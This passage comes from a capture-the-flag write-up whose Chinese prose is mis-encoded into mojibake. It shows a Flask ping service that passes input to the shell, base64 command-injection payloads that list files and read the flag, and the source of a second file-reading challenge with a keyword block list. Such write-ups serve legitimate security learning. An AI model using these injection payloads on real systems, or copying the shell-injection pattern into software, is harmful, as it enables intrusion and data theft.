</span></span><span class="line"><span class="cl">            <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">check</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">text</span><span class="o">=</span><span class="kc">True</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">process</span><span class="o">.</span><span class="n">stdout</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">flask</span><span class="o">.</span><span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/ping&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">ping</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">flask</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">json</span>
</span></span><span class="line"><span class="cl">    <span class="n">ip_base64</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;ip_base64&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">ip_base64</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">flask</span><span class="o">.</span><span class="n">jsonify</span><span class="p">({</span><span class="s1">&#39;error&#39;</span><span class="p">:</span> <span class="s1">&#39;no ip&#39;</span><span class="p">}),</span> <span class="mi">400</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="n">run_ping</span><span class="p">(</span><span class="n">ip_base64</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">result</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">flask</span><span class="o">.</span><span class="n">jsonify</span><span class="p">({</span><span class="s1">&#39;success&#39;</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span> <span class="s1">&#39;output&#39;</span><span class="p">:</span> <span class="n">result</span><span class="p">}),</span> <span class="mi">200</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">flask</span><span class="o">.</span><span class="n">jsonify</span><span class="p">({</span><span class="s1">&#39;success&#39;</span><span class="p">:</span> <span class="kc">False</span><span class="p">}),</span> <span class="mi">400</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">flask</span><span class="o">.</span><span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™ä¸ªwafæ£€æµ‹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">æ£€æµ‹æ˜¯å¦ä¸ºåˆæ³• IPv4 æ ¼å¼
</span></span><span class="line"><span class="cl">æ£€æµ‹æ˜¯å¦æ¯ä¸ªå­—æ®µéƒ½åœ¨ 0~255 èŒƒå›´å†…
</span></span><span class="line"><span class="cl">æ£€æµ‹å­—æ¯å­—ç¬¦
</span></span><span class="line"><span class="cl">æ£€æµ‹é•¿åº¦é™åˆ¶
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¸¸è§„ä¸å¯èƒ½ç»•è¿‡ï¼Œåªèƒ½åˆ©ç”¨Lunixä¸pythonä¸­çš„base64åº“çš„è§£æå·®å¼‚ï¼Œå½“pythonä¸­è§£æbase64æ—¶é‡åˆ°=åä¸ä¼šå¯¹åé¢çš„å­—ç¬¦è¿›è¡Œè§£ç ï¼Œä½†æ˜¯Lunixå‘½ä»¤ä¼š</p>
<p><img src="/p/2025n1ctf/image-20251125212735817.png"
	width="1019"
	height="243"
	srcset="/p/2025n1ctf/image-20251125212735817_hu_5c7886a57b4e2aa9.png 480w, /p/2025n1ctf/image-20251125212735817_hu_21986dcc2bd223e8.png 1024w"
	loading="lazy"
	
		alt="image-20251125212735817"
	
	
		class="gallery-image" 
		data-flex-grow="419"
		data-flex-basis="1006px"
	
></p>
<p><img src="/p/2025n1ctf/image-20251125212814372.png"
	width="653"
	height="66"
	srcset="/p/2025n1ctf/image-20251125212814372_hu_7f5135d46fa72b62.png 480w, /p/2025n1ctf/image-20251125212814372_hu_da3a923d579c6b6e.png 1024w"
	loading="lazy"
	
		alt="image-20251125212814372"
	
	
		class="gallery-image" 
		data-flex-grow="989"
		data-flex-basis="2374px"
	
></p>
<p>æ‰€ä»¥æˆ‘ä»¬ç›´æ¥å°†0.0.0.0ç¼–ç å¾—åˆ°</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">MC4wLjAuMA==
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>;ls /</code>base64ç¼–ç ä¸º<code>O2xzIC8=</code>,æ‹¼æ¥å°±æ˜¯</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">MC4wLjAuMQ==O2xzIC8=
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/2025n1ctf/image-20251125214828257.png"
	width="1258"
	height="307"
	srcset="/p/2025n1ctf/image-20251125214828257_hu_1041a62469055ba6.png 480w, /p/2025n1ctf/image-20251125214828257_hu_11bc656f2ef10935.png 1024w"
	loading="lazy"
	
		alt="image-20251125214828257"
	
	
		class="gallery-image" 
		data-flex-grow="409"
		data-flex-basis="983px"
	
></p>
<p>æ¥ä¸‹æ¥ç›´æ¥æ‹¿flagï¼Œ<code>;cat /f*</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">MC4wLjAuMQ==O2NhdCAvZio=
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/2025n1ctf/image-20251125215042389.png"
	width="1239"
	height="302"
	srcset="/p/2025n1ctf/image-20251125215042389_hu_a67f5f01772c9743.png 480w, /p/2025n1ctf/image-20251125215042389_hu_3041bbf51adf8ad8.png 1024w"
	loading="lazy"
	
		alt="image-20251125215042389"
	
	
		class="gallery-image" 
		data-flex-grow="410"
		data-flex-basis="984px"
	
></p>
<h2 id="peek-a-fork">Peek a Fork
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">fcntl</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">mmap</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;flag.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">mm</span> <span class="o">=</span> <span class="n">mmap</span><span class="o">.</span><span class="n">mmap</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">mm</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s1">&#39;flag.txt&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">FORBIDDEN</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s1">&#39;flag&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;proc&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;&lt;&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;&gt;&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;^&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#39;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;&#34;&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;..&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;./&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">PAGE</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;&lt;!DOCTYPE html&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;html lang=&#34;en&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;head&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;meta charset=&#34;UTF-8&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;title&gt;Secure Gateway&lt;/title&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;style&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">        body { font-family: &#39;Courier New&#39;, monospace; background-color: #0c0c0c; color: #00ff00; text-align: center; margin-top: 10%; }
</span></span></span><span class="line"><span class="cl"><span class="s2">        .container { border: 1px solid #00ff00; padding: 2rem; display: inline-block; }
</span></span></span><span class="line"><span class="cl"><span class="s2">        h1 { font-size: 2.5rem; text-shadow: 0 0 5px #00ff00; }
</span></span></span><span class="line"><span class="cl"><span class="s2">        p { font-size: 1.2rem; }
</span></span></span><span class="line"><span class="cl"><span class="s2">        .status { color: #ffff00; }
</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;/style&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;/head&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;body&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;div class=&#34;container&#34;&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;h1&gt;Firewall&lt;/h1&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;p class=&#34;status&#34;&gt;STATUS: All systems operational.&lt;/p&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;p&gt;Your connection has been inspected.&lt;/p&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;/div&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;/body&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;/html&gt;&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">handle_connection</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">log</span><span class="p">,</span> <span class="n">factor</span><span class="o">=</span><span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">conn</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mf">10.0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">log</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;log.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">fcntl</span><span class="o">.</span><span class="n">flock</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">fcntl</span><span class="o">.</span><span class="n">LOCK_EX</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">log_bytes</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">addr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">addr</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">factor</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                    <span class="n">log_bytes</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha3_256</span><span class="p">(</span><span class="n">log_bytes</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                <span class="n">log_entry</span> <span class="o">=</span> <span class="n">log_bytes</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">log_entry</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                
</span></span><span class="line"><span class="cl">        <span class="n">request_data</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">request_data</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;GET /&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">response</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;HTTP/1.1 400 Bad Request</span><span class="se">\r\n\r\n</span><span class="s2">Invalid Request&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="n">conn</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">path</span> <span class="o">=</span> <span class="n">request_data</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="n">pattern</span> <span class="o">=</span> <span class="sa">rb</span><span class="s1">&#39;\?offset=(\d+)&amp;length=(\d+)&#39;</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">            <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">            <span class="n">length</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">path</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="k">match</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">offset</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="k">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">                <span class="n">length</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="k">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">                
</span></span><span class="line"><span class="cl">                <span class="n">clean_path</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">path</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">filename</span> <span class="o">=</span> <span class="n">clean_path</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">filename</span> <span class="o">=</span> <span class="n">path</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">response</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;HTTP/1.1 400 Bad Request</span><span class="se">\r\n\r\n</span><span class="s2">Invalid Request&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="n">conn</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">filename</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">response_body</span> <span class="o">=</span> <span class="n">PAGE</span>
</span></span><span class="line"><span class="cl">            <span class="n">response_status</span> <span class="o">=</span> <span class="s2">&#34;200 OK&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">normpath</span><span class="p">(</span><span class="n">filename</span><span class="p">),</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="n">offset</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                        <span class="n">f</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                    
</span></span><span class="line"><span class="cl">                    <span class="n">data_bytes</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">length</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                    <span class="n">response_body</span> <span class="o">=</span> <span class="n">data_bytes</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">,</span> <span class="s1">&#39;ignore&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">response_status</span> <span class="o">=</span> <span class="s2">&#34;200 OK&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">response_body</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;Invalid path&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="n">response_status</span> <span class="o">=</span> <span class="s2">&#34;500 Internal Server Error&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;HTTP/1.1 </span><span class="si">{</span><span class="n">response_status</span><span class="si">}</span><span class="se">\r\n</span><span class="s2">Content-Length: </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">response_body</span><span class="p">)</span><span class="si">}</span><span class="se">\r\n\r\n</span><span class="si">{</span><span class="n">response_body</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">conn</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">    <span class="k">finally</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">os</span><span class="o">.</span><span class="n">_exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">server</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">server</span><span class="o">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">server</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">server</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">50</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Server listening on port 1337...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">pid</span><span class="p">,</span> <span class="n">status</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">waitpid</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">WNOHANG</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">ChildProcessError</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">pass</span>
